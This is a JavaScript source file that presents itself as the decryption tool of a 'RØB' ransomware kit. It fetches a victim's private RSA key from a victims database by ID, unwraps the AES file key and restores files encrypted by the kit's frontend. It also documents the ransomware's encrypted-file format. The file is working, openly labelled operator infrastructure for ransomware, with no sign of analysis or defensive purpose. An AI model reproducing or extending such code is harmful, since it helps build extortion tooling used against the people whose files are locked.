const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const victimId = process.argv[2];
const filePath = process.argv[3];

if (!victimId || !filePath) {
    console.error("=========================================");
    console.error("RØB Ransomware - Decryption Tool");
    console.error("Usage: node decrypt_tool.js <VictimID> <FilePath>");
    console.error("Example: node decrypt_tool.js V-1234ABCD /path/to/encrypted/file.txt");
    console.error("=========================================");
    process.exit(1);
}

try {
    // 1. Get Private Key from DB
    const dbPath = path.join(__dirname, 'db', 'victims.json');
    const victims = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
    const victim = victims.find(v => v.id === victimId);

    if (!victim) {
        console.error(`❌ Error: Victim ID ${victimId} not found in database!`);
        process.exit(1);
    }

    const privateKeyPem = victim.privateKey;
    console.log(`[+] Found private key for victim ${victimId}`);

    // 2. Read Encrypted File
    if (!fs.existsSync(filePath)) {
        console.error(`❌ Error: File ${filePath} does not exist!`);
        process.exit(1);
    }
    const encryptedBuffer = fs.readFileSync(filePath);

    // 3. Parse File Format
    // Format: [WrappedKeyLength (4 bytes, Little Endian)] + [WrappedKey] + [IV (12 bytes)] + [Ciphertext || Tag (16 bytes)]
    const keyLen = encryptedBuffer.readUInt32LE(0);
    let offset = 4;

    const wrappedKey = encryptedBuffer.subarray(offset, offset + keyLen);
    offset += keyLen;

    const iv = encryptedBuffer.subarray(offset, offset + 12);
    offset += 12;

    const ciphertextWithTag = encryptedBuffer.subarray(offset);
    const ciphertext = ciphertextWithTag.subarray(0, ciphertextWithTag.length - 16);
    const authTag = ciphertextWithTag.subarray(ciphertextWithTag.length - 16);

    console.log(`[+] Parsed payload: KeyLen=${keyLen}, IV=12 bytes, Ciphertext=${ciphertext.length} bytes, Tag=16 bytes`);

    // 4. Decrypt AES Key using RSA-2048 Private Key
    // Note: Frontend uses RSA-OAEP with SHA-256 hash.
    const aesKey = crypto.privateDecrypt({
        key: privateKeyPem,
        padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
        oaepHash: "sha256"
    }, wrappedKey);

    console.log(`[+] AES Symmetric Key successfully unwrapped!`);

    // 5. Decrypt File Content using AES-256-GCM
    const decipher = crypto.createDecipheriv('aes-256-gcm', aesKey, iv);
    decipher.setAuthTag(authTag);

    const decryptedPart1 = decipher.update(ciphertext);
    const decryptedPart2 = decipher.final();
    const finalDecrypted = Buffer.concat([decryptedPart1, decryptedPart2]);

    // 6. Save Decrypted File
    const outPath = filePath + '.decrypted';
    fs.writeFileSync(outPath, finalDecrypted);
    
    console.log(`✅ Success! File decrypted and saved to: ${outPath}`);

} catch (error) {
    console.error(`❌ Decryption failed:`, error.message);
    if (error.message.includes('auth tag')) {
        console.error("This usually means the file was corrupted or tampered with.");
    }
}
